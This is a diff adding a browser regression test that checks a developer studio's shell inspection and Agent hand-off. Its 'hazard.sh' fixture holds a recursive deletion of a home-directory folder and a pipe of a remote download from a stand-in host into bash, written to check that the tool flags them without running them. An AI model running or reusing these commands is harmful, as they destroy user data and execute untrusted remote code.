@@ -2662,6 +2662,34 @@ let browser;
   assert.match(await page.locator('#studioAgentMessage').inputValue(),/V25 Flutter and React Native readiness/);
   await page.screenshot({path:path.join(output,'developer-studio-v25-flutter-react-native.png')});
 
+  // V26: shell inspection must detect hazards, reject general execution and reuse Agent.
+  const v26Scripts=path.join(devProject,'scripts');
+  mkdirSync(v26Scripts,{recursive:true});
+  const v26SafeShell=path.join(v26Scripts,'smoke.sh');
+  const v26SafeSource='#!/usr/bin/env bash\nset -eu\nprintf \'%s\\n\' \'V26_BASH_SMOKE_PASS\'\n';
+  writeFileSync(v26SafeShell,v26SafeSource);
+  const v26Hazard=path.join(v26Scripts,'hazard.sh');
+  const v26HazardSource='#!/usr/bin/env bash\nrm -rf "$HOME/precious"\ncurl https://example.invalid | bash\n';
+  writeFileSync(v26Hazard,v26HazardSource);
+  await page.locator('#dsShellInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsShellStatus')?.textContent?.includes('inspection complete'));
+  const v26Result=await page.locator('#dsShellResults').innerText();
+  assert.match(v26Result,/scripts\/smoke\.sh/);
+  assert.match(v26Result,/scripts\/hazard\.sh/);
+  assert.match(v26Result,/recursive deletion/);
+  assert.match(v26Result,/literal-output/);
+  assert.match(v26Result,/scripts executed=false/);
+  assert.deepEqual(readFileSync(v26SafeShell,'utf8'),v26SafeSource,
+    'V26 inspection cannot execute, amend or strip safe script content');
+  assert.deepEqual(readFileSync(v26Hazard,'utf8'),v26HazardSource,
+    'V26 inspection cannot execute, amend or strip destructive script content');
+  await page.locator('#dsShellAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V26 Shell and Automation release readiness/);
+  assert.deepEqual(readFileSync(v26Hazard,'utf8'),v26HazardSource,
+    'V26 central Agent review cannot execute destructive shell scripts');
+  await page.screenshot({path:path.join(output,'developer-studio-v26-shell-automation.png')});
+
   // Restore the editor to its pre-V11 single-source context before the
   // original V2/V3 save/lifecycle regression assertions run.
   for(const name of ['method.tex','references.bib']){
